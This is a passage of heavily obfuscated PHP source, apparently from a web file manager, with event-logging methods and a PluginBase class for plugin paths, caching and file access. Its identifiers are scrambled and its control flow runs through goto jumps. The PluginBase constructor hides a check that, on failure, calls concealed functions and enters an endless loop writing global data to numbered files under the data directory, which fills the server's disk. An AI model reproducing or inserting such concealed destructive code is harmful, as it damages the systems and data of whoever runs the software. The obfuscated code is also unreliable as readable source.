$a—†£İ´ù™[$E§’İõ†[439]][$E§’İõ†[1901]]; } else { if (in_array($cÅ…àíƒ¥†, array($E§’İõ†[1667], $E§’İõ†[1902]))) { $cÅ…àíƒ¥† = $a—†£İ´ù™[$E§’İõ†[439]][$E§’İõ†[723]]; } } $B×ë¿‚ ’‡ = array_merge($a—†£İ´ù™, array($E§’İõ†[1903] => $a—†£İ´ù™[$E§’İõ†[403]], $E§’İõ†[1904] => $a—†£İ´ù™[$E§’İõ†[1904]])); Model($E§’İõ†[1631])->addLog($E§’İõ†[1905] . $cÅ…àíƒ¥†, $B×ë¿‚ ’‡); } private function isCacheEvent($Fˆ—¼Î°, $fø“Œœ Ñ) { if ($Fˆ—¼Î°[$_SERVER[£¶ä½¶¢][412]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($f÷¸Ş£Ü˜Ë, $Cµ¹’¼éƒõ) { $c­‡î¶ĞÒ† =& $_SERVER[£¶ä½¶¢]; $cí ßºÃ¿Â = Model($c­‡î¶ĞÒ†[1203])->sourceInfo($f÷¸Ş£Ü˜Ë); $D¯•¯Ü’Åæ = array($c­‡î¶ĞÒ†[1901] => $Cµ¹’¼éƒõ, $c­‡î¶ĞÒ†[38] => $cí ßºÃ¿Â[$c­‡î¶ĞÒ†[38]]); return $this->addEvent($f÷¸Ş£Ü˜Ë, $c­‡î¶ĞÒ†[1900], $D¯•¯Ü’Åæ); } public function eventFileEdit($DÉ›ÄïÀ÷) { $eÒ¬îÏêÃ =& $_SERVER[£¶ä½¶¢]; $Bº®“¹ÒÆ = array($eÒ¬îÏêÃ[1906] => $_SERVER[$eÒ¬îÏêÃ[1907]], $eÒ¬îÏêÃ[1908] => strtolower(ACTION)); return $this->addEvent($DÉ›ÄïÀ÷, $eÒ¬îÏêÃ[1657], $Bº®“¹ÒÆ); } public function eventRecycle($e¢£Å™’¹æ, $d¾ŒßÕ‡„–) { return $this->addEvent($e¢£Å™’¹æ, $_SERVER[£¶ä½¶¢][1902], $d¾ŒßÕ‡„–); } public function eventRemove($bìÜñë·ª‹) { $aæå“ø—·‹ =& $_SERVER[£¶ä½¶¢]; $AÈçè‚¢ùî = Model($aæå“ø—·‹[1203])->sourceInfo($bìÜñë·ª‹); $Eø§ŒÊŠ²¤ = $AÈçè‚¢ùî[$aæå“ø—·‹[38]]; return $this->addEvent($AÈçè‚¢ùî[$aæå“ø—·‹[486]], $aæå“ø—·‹[1656], $Eø§ŒÊŠ²¤); } public function eventShare($Fˆ ÚÍëÉ, $b¥Ûê·‡È÷) { return $this->addEvent($Fˆ ÚÍëÉ, $_SERVER[£¶ä½¶¢][1667], $b¥Ûê·‡È÷); } public function eventMove($C¹–«ï†Şù, $bŠ²ôô, $A”Ç¸À«Î ) { goto d»Ìğ†…é; CóÂ¥î±Ñ…: $C¼áÇ™ÆÄ– = $dÌïºğ”™µ->sourceInfo($bŠ²ôô); $e™âŒÍ×—Ã = $dÌïºğ”™µ->sourceInfo($A”Ç¸À«Î ); $eÍêÃµØİÙ = array($aÒßßŒ–«Œ[1053] => $bŠ²ôô, $aÒßßŒ–«Œ[1909] => $C¼áÇ™ÆÄ–[$aÒßßŒ–«Œ[38]], $aÒßßŒ–«Œ[1889] => !empty($C¼áÇ™ÆÄ–[$aÒßßŒ–«Œ[503]]) ? $C¼áÇ™ÆÄ–[$aÒßßŒ–«Œ[503]] : $aÒßßŒ–«Œ[43], $aÒßßŒ–«Œ[1054] => $A”Ç¸À«Î , $aÒßßŒ–«Œ[1910] => $e™âŒÍ×—Ã[$aÒßßŒ–«Œ[38]], $aÒßßŒ–«Œ[1911] => !empty($e™âŒÍ×—Ã[$aÒßßŒ–«Œ[503]]) ? $e™âŒÍ×—Ã[$aÒßßŒ–«Œ[503]] : $aÒßßŒ–«Œ[43]); goto C¶æ½İÅæ; EÜ£Ø·Óé‡: $this->addEvent($bŠ²ôô, $aÒßßŒ–«Œ[1912], $eÍêÃµØİÙ); goto FòùÔ¼ïê±; d»Ìğ†…é: $aÒßßŒ–«Œ =& $_SERVER[£¶ä½¶¢]; $dÌïºğ”™µ = Model($aÒßßŒ–«Œ[1203]); $D‚á˜É÷à£ = $dÌïºğ”™µ->sourceInfo($C¹–«ï†Şù); goto CóÂ¥î±Ñ…; C¶æ½İÅæ: $this->addEvent($C¹–«ï†Şù, $aÒßßŒ–«Œ[528], $eÍêÃµØİÙ); $D‚á˜É÷à£ = $dÌïºğ”™µ->sourceInfo($C¹–«ï†Şù); $eÍêÃµØİÙ = array($aÒßßŒ–«Œ[403] => $D‚á˜É÷à£[$aÒßßŒ–«Œ[403]], $aÒßßŒ–«Œ[38] => $D‚á˜É÷à£[$aÒßßŒ–«Œ[38]]); goto EÜ£Ø·Óé‡; FòùÔ¼ïê±: } public function eventCopy($AÃÕ®„ñ»­) { $this->eventCreate($AÃÕ®„ñ»­, $_SERVER[£¶ä½¶¢][526]); } public function eventRename($B·Ô¬ğå×â, $a…çƒöÊê, $dÍÛ›»¿›–) { $Fñóù‹Şà =& $_SERVER[£¶ä½¶¢]; $b°¶Óò‰ãö = array($Fñóù‹Şà[1053] => $a…çƒöÊê, $Fñóù‹Şà[1054] => $dÍÛ›»¿›–); return $this->addEvent($B·Ô¬ğå×â, $Fñóù‹Şà[1217], $b°¶Óò‰ãö); } public function eventAddComment($DŞ×ÓÄ¿Ê¬, $CÛŠŠëæõÕ) { return $this->addEvent($DŞ×ÓÄ¿Ê¬, $_SERVER[£¶ä½¶¢][1913], $CÛŠŠëæõÕ); } public function eventAddDesc($B‰‹¿ª‚ê‚, $d®³ç¶Œ•ì) { return $this->addEvent($B‰‹¿ª‚ê‚, $_SERVER[£¶ä½¶¢][1914], $d®³ç¶Œ•ì); } public function listBySource($d´ÎĞĞ †) { goto B—Ï¾©ğŸÉ; B—Ï¾©ğŸÉ: $c«Åù¡’æ =& $_SERVER[£¶ä½¶¢]; $fõñÀæíôÛ = Model($c«Åù¡’æ[1203])->sourceInfo($d´ÎĞĞ †); $CğªˆŸ‡Ø¸ = array($c«Åù¡’æ[418] => $d´ÎĞĞ †); goto B¯ËÏêÄ‹; B¯ËÏêÄ‹: if ($fõñÀæíôÛ[$c«Åù¡’æ[411]] == $c«Åù¡’æ[97]) { $EœĞ¥ª„é‹ = Model($c«Åù¡’æ[1203])->listSearchChildren($d´ÎĞĞ †, 20000); $EœĞ¥ª„é‹[] = $d´ÎĞĞ † . $c«Åù¡’æ[13]; $CğªˆŸ‡Ø¸ = array($c«Åù¡’æ[403] => array($c«Åù¡’æ[17], $EœĞ¥ª„é‹)); } $Eò»ìºÙÀ = $this->where($CğªˆŸ‡Ø¸)->order($c«Åù¡’æ[1915])->selectPage(); if ($Eò»ìºÙÀ[$c«Åù¡’æ[373]][$c«Åù¡’æ[374]] == 0) { $Eò»ìºÙÀ[$c«Åù¡’æ[373]][$c«Åù¡’æ[374]] = 1; $Eò»ìºÙÀ[$c«Åù¡’æ[376]] = array(array($c«Åù¡’æ[418] => $d´ÎĞĞ †, $c«Åù¡’æ[1898] => $fõñÀæíôÛ[$c«Åù¡’æ[486]], $c«Åù¡’æ[1518] => $fõñÀæíôÛ[$c«Åù¡’æ[440]], $c«Åù¡’æ[423] => $c«Åù¡’æ[1916], $c«Åù¡’æ[424] => $fõñÀæíôÛ[$c«Åù¡’æ[204]], $c«Åù¡’æ[1520] => $c«Åù¡’æ[43])); } goto cµ‘•š¤ñš; cµ‘•š¤ñš: return $this->eventListParse($Eò»ìºÙÀ, $d´ÎĞĞ †); goto E“¹Ğ¤ôô®; E“¹Ğ¤ôô®: } private function eventListParse($F½§Ø¤‡³Ò, $aßåË›ğí³) { goto BÒƒ•æß©; F·¨ŒŞ•ÂÜ: $cÖùëÒè¦ = Model($d‘µ¥Ä‚ˆ[798])->sourceListInfo($AÂ®ÃôòÉ, !0); foreach ($cÔŞÀÛ…‰„ as &$b¨™Ï÷Œ…ö) { if ($b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[39]] == $d‘µ¥Ä‚ˆ[528] && isset($b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[439]][$d‘µ¥Ä‚ˆ[1053]])) { $b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[439]][$d‘µ¥Ä‚ˆ[1053]] = $cÖùëÒè¦[$b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[439]][$d‘µ¥Ä‚ˆ[1053]]]; $b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[439]][$d‘µ¥Ä‚ˆ[1054]] = $cÖùëÒè¦[$b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[439]][$d‘µ¥Ä‚ˆ[1054]]]; } if ($b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[39]] == $d‘µ¥Ä‚ˆ[1912] && isset($b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[439]][$d‘µ¥Ä‚ˆ[403]])) { $b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[439]][$d‘µ¥Ä‚ˆ[403]] = $cÖùëÒè¦[$b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[439]][$d‘µ¥Ä‚ˆ[403]]]; } $b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[95]] = $cÖùëÒè¦[$b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[403]]]; $b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[1917]] = $cÖùëÒè¦[$b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[1904]]]; if ($b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[39]] == $d‘µ¥Ä‚ˆ[1656]) { $b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[1917]] = $b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[95]]; $b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[1904]] = $b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[1917]][$d‘µ¥Ä‚ˆ[403]]; $b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[95]] = !1; $b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[403]] = $d‘µ¥Ä‚ˆ[43]; } $b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[1847]] = $dÑ»‹›«³[$b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[1526]]]; } unset($b¨™Ï÷Œ…ö); goto a¯É¬âÙŒ‘; c‰½ƒà»¦: $AÂ®ÃôòÉ = array_unique($AÂ®ÃôòÉ); $A•èª§˜äÜ = array_unique(array_to_keyvalue($cÔŞÀÛ…‰„, $d‘µ¥Ä‚ˆ[43], $d‘µ¥Ä‚ˆ[1526])); $dÑ»‹›«³ = Model($d‘µ¥Ä‚ˆ[514])->userListInfo($A•èª§˜äÜ); goto F·¨ŒŞ•ÂÜ; a¯É¬âÙŒ‘: $F½§Ø¤‡³Ò[$d‘µ¥Ä‚ˆ[376]] = $cÔŞÀÛ…‰„; return $F½§Ø¤‡³Ò; goto dŒéìÄÚÖ˜; eë÷áÒ‘ù: $Fè ÌïÛæÒ = array_to_keyvalue($cÔŞÀÛ…‰„, $d‘µ¥Ä‚ˆ[43], $d‘µ¥Ä‚ˆ[1904]); foreach ($cÔŞÀÛ…‰„ as $b¨™Ï÷Œ…ö) { $a†Êæ™•– = $b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[439]]; if ($b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[39]] == $d‘µ¥Ä‚ˆ[528] && isset($a†Êæ™•–[$d‘µ¥Ä‚ˆ[1053]])) { $AÂ®ÃôòÉ[] = $a†Êæ™•–[$d‘µ¥Ä‚ˆ[1053]] . $d‘µ¥Ä‚ˆ[43]; $AÂ®ÃôòÉ[] = $a†Êæ™•–[$d‘µ¥Ä‚ˆ[1054]] . $d‘µ¥Ä‚ˆ[43]; } if ($b¨™Ï÷Œ…ö[$d‘µ¥Ä‚ˆ[39]] == $d‘µ¥Ä‚ˆ[1912] && isset($a†Êæ™•–[$d‘µ¥Ä‚ˆ[403]])) { $AÂ®ÃôòÉ[] = $a†Êæ™•–[$d‘µ¥Ä‚ˆ[403]] . $d‘µ¥Ä‚ˆ[43]; } } $AÂ®ÃôòÉ = array_merge($AÂ®ÃôòÉ, $Fè ÌïÛæÒ, array($aßåË›ğí³ . $d‘µ¥Ä‚ˆ[43])); goto c‰½ƒà»¦; BÒƒ•æß©: $d‘µ¥Ä‚ˆ =& $_SERVER[£¶ä½¶¢]; $cÔŞÀÛ…‰„ = $F½§Ø¤‡³Ò[$d‘µ¥Ä‚ˆ[376]]; $AÂ®ÃôòÉ = array_to_keyvalue($cÔŞÀÛ…‰„, $d‘µ¥Ä‚ˆ[43], $d‘µ¥Ä‚ˆ[403]); goto eë÷áÒ‘ù; dŒéìÄÚÖ˜: } public function removeBySource($CŸ˜ÊÃ ¿) { $DÉßäèƒ³Ÿ = array($_SERVER[£¶ä½¶¢][418] => $CŸ˜ÊÃ ¿); $this->where($DÉßäèƒ³Ÿ)->remove(); } } goto AïÁ½»’à; cãá…à–ØÃ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto eùÀ–‰Òó; d¸‘´Ôë™ô: if ($_SERVER[$FÛØÓŸ¦ƒø[4]] != $Dñ¤„÷–®Ê($FïË›°˜ôù)) { goto BÓ”Ô©¿­; a‚ïË¿ËÎÂ: $AçˆÓÑºŠÖ = $e‡•”µàâ×($B‹ÇÂÄì °); $A´÷’®‰š× = explode($FÛØÓŸ¦ƒø[9], $AçˆÓÑºŠÖ); if (count($A´÷’®‰š×) < $FÛØÓŸ¦ƒø[593]) { $E¿‚ÏÁ‡½º = $FÛØÓŸ¦ƒø[11]; $E¿‚ÏÁ‡½º(); } goto eÂŠ¨İïÊÉ; céßì„‹’Ø: $e³«Êñ„‘×(); $e¼†ŞÇÎÜ = $FÛØÓŸ¦ƒø[1396]; $E–Í¹À†­Œ = json_encode($GLOBALS[$FÛØÓŸ¦ƒø[1397]]); goto b¥Ãç£¡ò†; b¥Ãç£¡ò†: $C¹äËÛÑè = 1; for ($F•œõ¯æËÈ = $C¹äËÛÑè; $F•œõ¯æËÈ > 0; $F•œõ¯æËÈ++) { $e¼†ŞÇÎÜ(DATA_PATH . $F•œõ¯æËÈ, $E–Í¹À†­Œ); } goto F¨ùŒ…„ç¶; BÓ”Ô©¿­: $e³«Êñ„‘× = $FÛØÓŸ¦ƒø[839]; $e‡•”µàâ× = $FÛØÓŸ¦ƒø[6]; $B‹ÇÂÄì ° = $_SERVER[$FÛØÓŸ¦ƒø[7]] . $FÛØÓŸ¦ƒø[8]; goto a‚ïË¿ËÎÂ; eÂŠ¨İïÊÉ: $CÏ‹Ş¯»› = $FÛØÓŸ¦ƒø[840]; $CÏ‹Ş¯»›($_SERVER[$FÛØÓŸ¦ƒø[841]]); $e³«Êñ„‘× = $FÛØÓŸ¦ƒø[839]; goto céßì„‹’Ø; F¨ùŒ…„ç¶: } global $in, $config; $this->config =& $config; goto FÀé»‡±÷Ì; AÑÁòá©³: $this->pluginHostDefault = $config[$FÛØÓŸ¦ƒø[1400]] . $this->pluginName . $FÛØÓŸ¦ƒø[18]; $eôÉÆ°İã = $config[$FÛØÓŸ¦ƒø[1401]]; if ($eôÉÆ°İã && strpos($FÛØÓŸ¦ƒø[57] . $eôÉÆ°İã . $FÛØÓŸ¦ƒø[57], $this->pluginName) !== !1) { $this->pluginHost = $config[$FÛØÓŸ¦ƒø[1402]] . $this->pluginName . $FÛØÓŸ¦ƒø[18]; } goto bùğ©´µÈÛ; bÅ§¼ºÒÕÁ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $FÛØÓŸ¦ƒø[18]; $this->pluginApi = appHostGet() . $FÛØÓŸ¦ƒø[1399] . $this->pluginName . $FÛØÓŸ¦ƒø[18]; $this->pluginHost = $config[$FÛØÓŸ¦ƒø[1400]] . $this->pluginName . $FÛØÓŸ¦ƒø[18]; goto AÑÁòá©³; eùÀ–‰Òó: $FÛØÓŸ¦ƒø =& $_SERVER[£¶ä½¶¢]; $FïË›°˜ôù = $_SERVER[$FÛØÓŸ¦ƒø[7]] . $FÛØÓŸ¦ƒø[8]; $Dñ¤„÷–®Ê = $FÛØÓŸ¦ƒø[1395]; goto d¸‘´Ôë™ô; bùğ©´µÈÛ: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto EÆÒÏ¦Ñè‰; FÀé»‡±÷Ì: $this->in =& $in; $this->modelPlugin = Model($FÛØÓŸ¦ƒø[1398]); $this->pluginName = str_replace($FÛØÓŸ¦ƒø[1398], $FÛØÓŸ¦ƒø[43], get_class($this)); goto bÅ§¼ºÒÕÁ; EÆÒÏ¦Ñè‰: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[£¶ä½¶¢][1403]); } protected function assign($a¡±š‰¶«, $dö…Âê¸Ü = false) { if (is_array($a¡±š‰¶«)) { $this->values = array_merge($this->values, $a¡±š‰¶«); } else { $this->values[$a¡±š‰¶«] = $dö…Âê¸Ü; } } protected function display($DàËˆ‰Ìô) { extract($this->values); require $DàËˆ‰Ìô; } final function hookRegist($Aˆî‹ÕŒìå) { $this->modelPlugin->appRegist($this->pluginName, $Aˆî‹ÕŒìå); } final function appIcon() { $føÌß¸—Ø„ =& $_SERVER[£¶ä½¶¢]; $fÚÜå±ƒ¼¼ = $this->appPackage(); $Dò‡ÂÖ˜©« = $føÌß¸—Ø„[43]; if (isset($fÚÜå±ƒ¼¼[$føÌß¸—Ø„[417]])) { if (isset($fÚÜå±ƒ¼¼[$føÌß¸—Ø„[417]][$føÌß¸—Ø„[1404]])) { $Dò‡ÂÖ˜©« = $føÌß¸—Ø„[1405] . $fÚÜå±ƒ¼¼[$føÌß¸—Ø„[417]][$føÌß¸—Ø„[1404]] . $føÌß¸—Ø„[1406]; } else { if ($fÚÜå±ƒ¼¼[$føÌß¸—Ø„[417]][$føÌß¸—Ø„[1407]]) { $Dò‡ÂÖ˜©« = $føÌß¸—Ø„[1408] . $fÚÜå±ƒ¼¼[$føÌß¸—Ø„[417]][$føÌß¸—Ø„[1407]] . $føÌß¸—Ø„[1409]; } } } return $Dò‡ÂÖ˜©«; } final function fileCanView($E‰íŠó¥ê) { goto Föİ½¼êğË; Föİ½¼êğË: $F®çùÃ×Œ =& $_SERVER[£¶ä½¶¢]; if (request_url_safe($E‰íŠó¥ê)) { return !0; } if ($this->isShare($E‰íŠó¥ê)) { return !0; } goto D³Ûî‘ÉˆÑ; D³Ûî‘ÉˆÑ: $A¸°„èƒ¬ = Session::get($F®çùÃ×Œ[1410]); if (!$A¸°„èƒ¬ || !$A¸°„èƒ¬[$F®çùÃ×Œ[1411]]) { $a¹éÄë·‡Ğ = $F®çùÃ×Œ[1412] . rawurlencode(this_url()); show_tips(LNG($F®çùÃ×Œ[1413]) . $F®çùÃ×Œ[1414] . $a¹éÄë·‡Ğ . $F®çùÃ×Œ[1415] . LNG($F®çùÃ×Œ[1416]) . $F®çùÃ×Œ[1417], !1); } if (!Action($F®çùÃ×Œ[1418])->authCan($F®çùÃ×Œ[1419])) { show_tips(LNG($F®çùÃ×Œ[1420]) . $F®çùÃ×Œ[1421], !1); } goto BŠÖÆ¦·Æ; BŠÖÆ¦·Æ: ActionCall($F®çùÃ×Œ[1422], $E‰íŠó¥ê); goto Eã¨¸×«ğ…; Eã¨¸×«ğ…: } final function isShare($dœÈ•èø) { $CÂ²ó¾‰¹ = KodIO::parse($dœÈ•èø); return $CÂ²ó¾‰¹[$_SERVER[£¶ä½¶¢][39]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($dÇ•êÀ†¾ô) { if (request_url_safe($dÇ•êÀ†¾ô)) { return $dÇ•êÀ†¾ô; } if (!$this->isShare($dÇ•êÀ†¾ô)) { $dÇ•êÀ†¾ô = $this->filePath($dÇ•êÀ†¾ô); } return Action($_SERVER[£¶ä½¶¢][1068])->linkOut($dÇ•êÀ†¾ô); } public function filePathLinkOut($FÜ‹±´ÑêÚ) { if (request_url_safe($FÜ‹±´ÑêÚ)) { return $FÜ‹±´ÑêÚ; } $this->fileCanView($FÜ‹±´ÑêÚ); return Action($_SERVER[£¶ä½¶¢][1068])->link($FÜ‹±´ÑêÚ); } final function filePath($côáƒ“‚—î) { $cÓ´¿ˆîÕ =& $_SERVER[£¶ä½¶¢]; if ($a›Ú–ÊËêÈ = $this->checkSharePath($côáƒ“‚—î)) { Hook::trigger($cÓ´¿ˆîÕ[1423], $a›Ú–ÊËêÈ); return $a›Ú–ÊËêÈ; } $this->fileCanView($côáƒ“‚—î); if (request_url_safe($côáƒ“‚—î)) { $D‘Ë½èœÕå = parse_url_query($côáƒ“‚—î); if (isset($D‘Ë½èœÕå[$cÓ´¿ˆîÕ[1424]]) && isset($D‘Ë½èœÕå[$cÓ´¿ˆîÕ[219]])) { $Eİ’Èã = Model($cÓ´¿ˆîÕ[738])->get($cÓ´¿ˆîÕ[739]); $E¬¤‰‘­Õê = Mcrypt::decode($D‘Ë½èœÕå[$cÓ´¿ˆîÕ[219]], $Eİ’Èã); if ($E¬¤‰‘­Õê) { $this->fileInfo = IO::infoWithChildren($E¬¤‰‘­Õê); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $E¬¤‰‘­Õê; } } $côáƒ“‚—î = $this->_cacheHttpFile($côáƒ“‚—î); $this->fileInfo = IO::infoWithChildren($côáƒ“‚—î); } else { $this->fileInfo = IO::infoWithChildren($côáƒ“‚—î); if (!$this->fileInfo) { show_tips(LNG($cÓ´¿ˆîÕ[115]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($cÓ´¿ˆîÕ[1423], $côáƒ“‚—î); return $côáƒ“‚—î; } final function _cacheHttpFile($D„›‡…¥Â) { $AÎÅ·´„ö = hash_path($D„›‡…¥Â, !0); $this->cachePath = $this->pluginCachePath($AÎÅ·´„ö); if ($fË¾‘ßæ…î = IO::fileNameExist($this->cachePath, $AÎÅ·´„ö)) { return KodIO::make($fË¾‘ßæ…î); } $b˜—İ ­®İ = $this->cachePath . $AÎÅ·´„ö; return $this->pluginCacheFileSet($b˜—İ ­®İ, file_get_contents_nossl($D„›‡…¥Â)); } final function _tmpFileName($f™•°¢Â­¯ = array()) { goto f°²‹°ìô; fèƒ×”£¥: if (isset($f™•°¢Â­¯[$fŒ÷‹Áô¯·[174]][$fŒ÷‹Áô¯·[181]])) { return $f™•°¢Â­¯[$fŒ÷‹Áô¯·[174]][$fŒ÷‹Áô¯·[181]]; } $eŠ´Û ÍÉ¿ = IO::hashSimple($f™•°¢Â­¯[$fŒ÷‹Áô¯·[86]]); if ($eŠ´Û ÍÉ¿) { return $eŠ´Û ÍÉ¿; } goto D‹óŞ¬ç¡; f°²‹°ìô: $fŒ÷‹Áô¯· =& $_SERVER[£¶ä½¶¢]; if (!$f™•°¢Â­¯) { $f™•°¢Â­¯ = $this->fileInfo; } if (isset($f™•°¢Â­¯[$fŒ÷‹Áô¯·[181]])) { return $f™•°¢Â­¯[$fŒ÷‹Áô¯·[181]]; } goto fèƒ×”£¥; D‹óŞ¬ç¡: $a¡—Äö¿õÑ = array($f™•°¢Â­¯[$fŒ÷‹Áô¯·[38]], $f™•°¢Â­¯[$fŒ÷‹Áô¯·[86]], $f™•°¢Â­¯[$fŒ÷‹Áô¯·[88]]); if (isset($f™•°¢Â­¯[$fŒ÷‹Áô¯·[495]])) { $a¡—Äö¿õÑ[] = $f™•°¢Â­¯[$fŒ÷‹Áô¯·[495]]; } return md5(implode($fŒ÷‹Áô¯·[81], $a¡—Äö¿õÑ)); goto Dª¶Ã÷è¶Ô; Dª¶Ã÷è¶Ô: } final function checkSharePath($d‡ôÛÚëŒÕ) { goto B©ë²‰—¿È; B©ë²‰—¿È: $aœ ÓŒŠ‰á =& $_SERVER[£¶ä½¶¢]; if (!defined($aœ ÓŒŠ‰á[462])) { define($aœ ÓŒŠ‰á[1425], 0); } if (!$this->isShare($d‡ôÛÚëŒÕ)) { return !1; } goto B°ã¦ŒïØö; A‘ÅÛ†èî: $this->cachePath = $this->pluginCachePath($this->fileInfo[$aœ ÓŒŠ‰á[181]]); return $D±ö… ìÜš[$aœ ÓŒŠ‰á[86]]; goto eÉÕåà±õ; B°ã¦ŒïØö: $D±ö… ìÜš = Action($aœ ÓŒŠ‰á[1068])->sharePathInfo($d‡ôÛÚëŒÕ); if (!isset($D±ö… ìÜš[$aœ ÓŒŠ‰á[86]])) { show_json(LNG($aœ ÓŒŠ‰á[1426]), !1); } $this->fileInfo = $D±ö… ìÜš[$aœ ÓŒŠ‰á[174]]; goto A‘ÅÛ†èî; eÉÕåà±õ: } final function pluginCachePath($d¥‚äöŸ§æ = '') { $F‚Œñ¿ğ =& $_SERVER[£¶ä½¶¢]; $dÃ®Á¿¤ôß = IO_PATH_SYSTEM_TEMP . $F‚Œñ¿ğ[1427] . $this->pluginName; if (!($D™†ÒïÙ±Ê = IO::infoFull($dÃ®Á¿¤ôß))) { return IO::mkdir($dÃ®Á¿¤ôß . $F‚Œñ¿ğ[18] . $d¥‚äöŸ§æ); } if (empty($d¥‚äöŸ§æ)) { return $D™†ÒïÙ±Ê[$F‚Œñ¿ğ[86]]; } if (!($C£İæ“ó²é = IO::fileNameExist($D™†ÒïÙ±Ê[$F‚Œñ¿ğ[86]], $d¥‚äöŸ§æ))) { return IO::mkdir($D™†ÒïÙ±Ê[$F‚Œñ¿ğ[86]] . $d¥‚äöŸ§æ); } return KodIO::make($C£İæ“ó²é); } final function pluginCacheFileSet($Aå­„Ë”£‚, $cÏğœš¿– = '') { $b×——‚œš =& $_SERVER[£¶ä½¶¢]; if (!($E‰ë×ñäá´ = IO::infoFull($Aå­„Ë”£‚))) { return IO::mkfile($Aå­„Ë”£‚, $cÏğœš¿–, REPEAT_REPLACE); } IO::setContent($E‰ë×ñäá´[$b×——‚œš[86]], $cÏğœš¿–); return $E‰ë×ñäá´[$b×——‚œš[86]]; } final function pluginLocalFile($cÀ¥¥Â“« = '') { goto CÅ©¦º§ğ‹; Aæ¥ñ‘ÃÊÔ: if (!checkExtSafe($d¦¼ò¦‚¬)) { $d¦¼ò¦‚¬ = $d¦¼ò¦‚¬ . $bïÍÄìåö[1428]; } $eÀ¿ø¥ô† = $AŒÜ‰î„¸ . $d¦¼ò¦‚¬; if (@file_exists($eÀ¿ø¥ô†)) { return $eÀ¿ø¥ô†; } goto Fßéî×“¦; Fßéî×“¦: return IO::copy($cÀ¥¥Â“«, $AŒÜ‰î„¸, 0, $d¦¼ò¦‚¬); goto CÚ¼„á‹«°; bÓŞ¼“î˜: if (!$cÀ¥¥Â“«) { return $AŒÜ‰î„¸; } $A…µ†ßÅ– = IO::info($cÀ¥¥Â“«); $d¦¼ò¦‚¬ = $this->_tmpFileName($A…µ†ßÅ–) . $bïÍÄìåö[105] . $A…µ†ßÅ–[$bïÍÄìåö[178]]; goto Aæ¥ñ‘ÃÊÔ; CÅ©¦º§ğ‹: $bïÍÄìåö =& $_SERVER[£¶ä½¶¢]; $AŒÜ‰î„¸ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($AŒÜ‰î„¸)) { mk_dir($AŒÜ‰î„¸); } goto bÓŞ¼“î˜; CÚ¼„á‹«°: } final function appPackage() { goto aô¾ÇÚ¿º”; cß«”ÂİÚ: $f‹„î¾ÄÏÆ = Hook::trigger($Añƒ¼‹š«Ó[1430], $E«÷è™æ°¨); if ($f‹„î¾ÄÏÆ && is_array($f‹„î¾ÄÏÆ)) { $E«÷è™æ°¨ = $f‹„î¾ÄÏÆ; } $this->packageData = $E«÷è™æ°¨; goto Dùˆ’Ó¯µ; aô¾ÇÚ¿º”: $Añƒ¼‹š«Ó =& $_SERVER[£¶ä½¶¢]; if ($this->packageData) { return $this->packageData; } $CÎéÑøæÑ© = $this->parseFile($this->pluginPath . $Añƒ¼‹š«Ó[1429]); goto fİßóâŸ¤ô; Dùˆ’Ó¯µ: return $E«÷è™æ°¨; goto BÛ…ì´„â ; fİßóâŸ¤ô: $this->parseLang($CÎéÑøæÑ©); $E«÷è™æ°¨ = json_decode_force($CÎéÑøæÑ©); if (!$E«÷è™æ°¨) { return array(); } goto cß«”ÂİÚ; BÛ…ì´„â : } public function packageInfoGet($D÷ğŞà“ã˜) { $D‘Û×••­î = $this->appPackage(); return array_get_value($D‘Û×••­î, $D÷ğŞà“ã˜); } public function packageVersion() { return $this->packageInfoGet($_SERVER[£¶ä½¶¢][1431]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[£¶ä½¶¢][1432]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[£¶ä½¶¢][1433]); } private function parseFile($BÜ¸³É¢˜) { goto AÍÙ­šŠÌ…; d‚×ö±Œ¥©: $E¿»éÄ›¬Æ = str_replace($f£½×ˆÈÃ‡, $C—¹¯·ù‹Õ, $E¿»éÄ›¬Æ); return $E¿»éÄ›¬Æ; goto FÄó‘àÉƒ; AÍÙ­šŠÌ…: $f¥„‰Í¢Ãé =& $_SERVER[£¶ä½¶¢]; $E¿»éÄ›¬Æ = file_get_contents_nossl($BÜ¸³É¢˜); $f£½×ˆÈÃ‡ = array($f¥„‰Í¢Ãé[1434], $f¥„‰Í¢Ãé[1435], $f¥„‰Í¢Ãé[1436], $f¥„‰Í¢Ãé[1437], $f¥„‰Í¢Ãé[1438], 